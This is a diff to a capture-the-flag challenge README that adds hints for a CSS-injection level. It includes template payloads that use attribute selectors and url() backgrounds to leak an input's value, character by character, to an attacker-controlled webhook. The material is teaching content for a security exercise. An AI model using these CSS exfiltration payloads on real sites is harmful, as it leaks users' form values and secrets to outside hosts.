@@ -48,11 +48,43 @@ The following challenges in increasing difficulty are deployed to [platform.acmc
 7. Once he opens your page, you should get a visit to your webhook with the letter(s) logged there (fingers crossed).
 8. If the letters match, he will give you the flag :D. If they don't ...
 
+Also, if you are scripting in python, use pyperclip library or a similiar library. It allows you to copy text, instead of having to manually highlight your output and copy it.
+
+### Hints for Style-Stealer
+
+starter script:
+```
+<input value = "...">
+[value = "..."] {
+    color: red;
+    background: url(...); /* this will make a request to your webhook if the value matches your "..." */
+}
+```
+
+sending multiple webhooks:
+```
+input {
+    --aaa: none;
+    --bbb: none;
+    ...
+}
+[value^="a"] { --aaa: url(.../aaa); }
+[value^="b"] { --bbb: url(.../bbb); }
+...
+[value]{
+    background: var(--aaa), var(--bbb), ...;
+}
+```
+
+conceptual question #1: why do we use 3 character long pattern searches?
+conceptual question #2: how will we solve level 100 with only 3 character long searches?
+
+note: there is also a recursive method to solve level 100 but that requires a web server (ask Ronak for more details)
+
 ## Resources
 
 - [webhook.site](http://webhook.site)
 - [CSS Attribute Selectors](https://developer.mozilla.org/en-US/docs/Web/CSS/Attribute_selectors)
 - [Blind CSS Data Exfiltration](https://medium.com/@angryovalegg/blind-css-data-exfiltration-8dd6614236b2)
 - [Testing for CSS Injection](https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/11-Client-side_Testing/05-Testing_for_CSS_Injection)
-
 
